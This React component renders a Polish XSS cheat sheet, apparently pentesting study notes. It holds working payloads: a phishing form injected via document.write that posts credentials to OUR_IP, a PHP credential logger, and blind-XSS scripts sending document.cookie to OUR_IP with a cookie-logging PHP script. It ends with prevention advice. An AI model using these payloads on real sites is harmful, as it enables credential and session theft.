import './xss.scss';
import { Link } from 'react-router-dom';
import blind_xss_example from '../../../assets/blind_xss_example.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const XSS = () => {

    return(
        <section>
            <h1>Cross-Site Scripting (XSS)</h1>
            <table>
                <thead>
                  <tr>
                        <th>Typ</th>
                        <th>Opis</th>
                   </tr>
                </thead>
                <tbody>
                    <tr>
                       <td>Reflected XSS</td>
                        <td>Występuje, gdy po przetworzeniu na stronie zostaną wyświetlone dane wprowadzone przez użytkownika (np. wynik wyszukiwania lub komunikat o błędzie).</td>
                    </tr>
                    <tr>
                        <td>Stored XSS</td>
                        <td>Występuje, gdy dane wejściowe użytkownika są przechowywane w wewnętrznej bazie danych, a następnie wyświetlane po pobraniu (np. posty lub komentarze).</td>
                   </tr>
                    <tr>
                        <td>DOM XSS</td>
                         <td>Występuje, gdy dane wprowadzone przez użytkownika są wyświetlane bezpośrednio w przeglądarce i zapisywane w obiekcie HTML DOM (np. nazwa użytkownika lub tytuł strony, która może być podatna na ataki).</td>
                    </tr>
                </tbody>
            </table>

            <hr />

            <h2>XSStrike</h2>
            <div className='example_code'>
                <p>git clone https://github.com/FilipowiczP/XSStrike</p>
                <p>cd XSStrike</p>
                <p>pip install -r requirements.txt</p>
                <p>python xsstrike.py</p>
                <p>python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" </p>
            </div>

            <hr />

            <h2><Link to='https://github.com/FilipowiczP/AllPayloadXss/blob/master/README.md#bypass--using-another-character'>All XSS Payloads</Link></h2>
        
            <hr />

            <h2>Phishing XSS</h2>
            <p>Dodajemy w url script który modyfikuje stronę by stworzyć fałszywy formularz</p>
            <div className='example_code'>
                <p>{`<h3>Please login to continue</h3>`}</p>
                <p>{`<form action=http://OUR_IP>`}</p>
                <p className='tab-1'>{`<input type="username" name="username" placeholder="Username">`}</p>
                <p className='tab-1'>{`<input type="password" name="password" placeholder="Password">`}</p>
                <p className='tab-1'>{`<input type="submit" name="submit" value="Login">`}</p>
                <p>{`</form>`}</p>
            </div>

            <p>Włączamy nasłuchiwanie pod naszym ip <span className='important'>nc -lvnp 80</span></p>
            <p>Całość umieszczamy w url i wysyłamy do ofiary 
                <span className='important'> {`document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>')`}</span>
            </p>
            <h4>Przykład </h4>
            <p className='important'>{`http://SERVER_IP/phishing/index.php?url=document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>')`}</p>
            
            <div className='waring'>
                <p>Może się pojawić na końcu niechciany wyrenderowany kod aby temu zapobiec możemy dodać komentarz HTML <span className='important'>{'<!-- '}</span>.</p>
            </div>

            <h4>Przykład z zastosowaniem PHP</h4>
            <div className='example_code'>
                <p>{`<?php`}</p>
                <p className='tab-1'>{`if (isset($_GET['username']) && isset($_GET['password'])) {`}</p>
                <p className='tab-2'>{`$file = fopen("creds.txt", "a+");`}</p>
                <p className='tab-2'>{`fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");`}</p>
                <p className='tab-2'>{`header("Location: http://SERVER_IP/phishing/index.php");`}</p>
                <p className='tab-2'>{`fclose($file);`}</p>
                <p className='tab-2'>{`exit();`}</p>
                <p className='tab-1'>{`}`}</p>
                <p>{`?>`}</p>
            </div>

            <hr />

            <h3>Blind XSS</h3>
            <p>Często pojawia się przy formularzach, które są wysyłane i obsługiwane przez Admina</p>
            <p>W celu wykrycia które pole jest podatne. Możemy do każdego z nich załączyć taki script</p>
            <p className='important'>{`<script src="http://OUR_IP/NAZWA_POLA"></script>`}</p>

            <div className='waring'>
                <p>Pamiętajmy by przed wysłaniem XSS włączyć lokalny serwer nasłuchujący, by wiedzieć jakie pole wywołało XSS. <span className='important'>php -S 0.0.0.0:80</span></p>
            </div>

            <p>Po wykryciu zmieniamy script na:</p>
            <p className='important'>document.location='http://OUR_IP/index.php?c='+document.cookie;</p>
            <p className='important'>new Image().src='http://OUR_IP/index.php?c='+document.cookie;</p>
            <p>Wysyłamy {`<script src=http://OUR_IP/script.js></script>`}</p>

            <p>Tworzymy plik index.php</p>
            <div className='example_code'>
                <p>{`<?php`}</p>
                <p className='tab-1'>{`if (isset($_GET['c'])) {`}</p>
                <p className='tab-2'>{`$list = explode(";", $_GET['c']);`}</p>
                <p className='tab-3'>{`foreach ($list as $key => $value) {`}</p>
                <p className='tab-3'>{`$cookie = urldecode($value);`}</p>
                <p className='tab-3'>{`$file = fopen("cookies.txt", "a+");`}</p>
                <p className='tab-3'>{`fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");`}</p>
                <p className='tab-3'>{`fclose($file);`}</p>
                <p className='tab-2'>{`}`}</p>
                <p className='tab-1'>{`}`}</p>
                <p>{`?>`}</p>
            </div>

            <h4 className='important'>Rezultat:</h4>
            <ExampleFrame screen={blind_xss_example}/>

            <hr />

            <h2 className='defense'>Zapobieganie XSS</h2>
            <p>Najważniejszym aspektem zapobiegania podatnościom XSS jest odpowiednie oczyszczanie danych wejściowych i sprawdzanie poprawności zarówno po stronie frontonu, jak i zaplecza. Oprócz tego można zastosować inne środki bezpieczeństwa, aby zapobiec atakom XSS.</p>
            <p>Oprócz sprawdzania poprawności danych wejściowych powinniśmy zawsze upewnić się, że nie zezwalamy na wprowadzanie danych zawierających kod JavaScript poprzez ucieczkę jakichkolwiek znaków specjalnych.</p>
            <p>Wejście bezpośrednie - Na koniec powinniśmy zawsze upewnić się, że nigdy nie używamy danych wprowadzanych przez użytkownika bezpośrednio w określonych tagach HTML, takich jak:</p>
            <div className='example_code'>
                <p>JavaScript <span className='defense'>{`<script></script>`}</span></p>
                <p>CSS Style <span className='defense'>{`<style></style>`}</span></p>
                <p>Tag/Attribute Pola <span className='defense'>{`<div name='INPUT'></div>`}</span></p>
                <p>HTML komentarz <span className='defense'>{`<!-- -->`}</span></p>
            </div>

            <p>Jeśli użytkownik wprowadzi dane do któregokolwiek z powyższych przykładów, może wstrzyknąć złośliwy kod JavaScript, co może prowadzić do luki w zabezpieczeniach XSS. Oprócz tego powinniśmy unikać używania funkcji JavaScript, które umożliwiają zmianę surowego tekstu pól HTML, takich jak:</p>
            <ul>
                <li className='defense'>DOM.innerHTML</li>
                <li className='defense'>DOM.outerHTML</li>
                <li className='defense'>document.write()</li>
                <li className='defense'>document.writeln()</li>
                <li className='defense'>document.domain</li>
            </ul>
            <p>Oraz następujące funkcje jQuery:</p>
            <ul>
                <li className='defense'>html()</li>
                <li className='defense'>parseHTML()</li>
                <li className='defense'>add()</li>
                <li className='defense'>append()</li>
                <li className='defense'>prepend()</li>
                <li className='defense'>after()</li>
                <li className='defense'>insertAfter()</li>
                <li className='defense'>before()</li>
                <li className='defense'>insertBefore()</li>
                <li className='defense'>replaceAll()</li>
                <li className='defense'>replaceWith()</li>
            </ul>
            <p>Ponieważ funkcje te zapisują nieprzetworzony tekst w kodzie HTML, wszelkie dane wprowadzone przez użytkownika mogą zawierać złośliwy kod JavaScript, co prowadzi do luki w zabezpieczeniach XSS.</p>
            <p>Powinniśmy mieć również środki zapobiegające XSS na zapleczu. Można to osiągnąć za pomocą oczyszczania i sprawdzania danych wejściowych i wyjściowych, konfiguracji serwera i narzędzi zaplecza, które pomagają zapobiegać podatnościom XSS.</p>
            <p>Kolejnym ważnym aspektem, na który należy zwrócić uwagę na zapleczu, jest kodowanie wyjściowe. Oznacza to, że musimy zakodować dowolne znaki specjalne w ich kodach HTML, co jest pomocne, jeśli chcemy wyświetlić całość danych wprowadzonych przez użytkownika bez wprowadzania luki XSS. W przypadku backendu PHP możemy użyć funkcji htmlspecialchars lub htmlentities, które zakodują pewne znaki specjalne w ich kodach HTML {`(np. < w &lt)`}, dzięki czemu przeglądarka wyświetli je poprawnie</p>
        
            <h4 className='defense'>Konfiguracje serwera</h4>
            <ul>
                <li className='defense'>Korzystanie z protokołu HTTPS w całej domenie.</li>
                <li className='defense'>Korzystanie z nagłówków zapobiegania XSS.</li>
                <li className='defense'>Używanie odpowiedniego typu zawartości dla strony, np. X-Content-Type-Options=nosniff.</li>
                <li className='defense'>Używanie opcji Content-Security-Policy, takich jak script-src „self”, które zezwalają tylko na skrypty hostowane lokalnie.</li>
                <li className='defense'>Używanie flag plików cookie HttpOnly i Secure, aby uniemożliwić JavaScriptowi odczytywanie plików cookie i przesyłać je tylko przez HTTPS.</li>
            </ul>
        </section>
    )
};

export default XSS;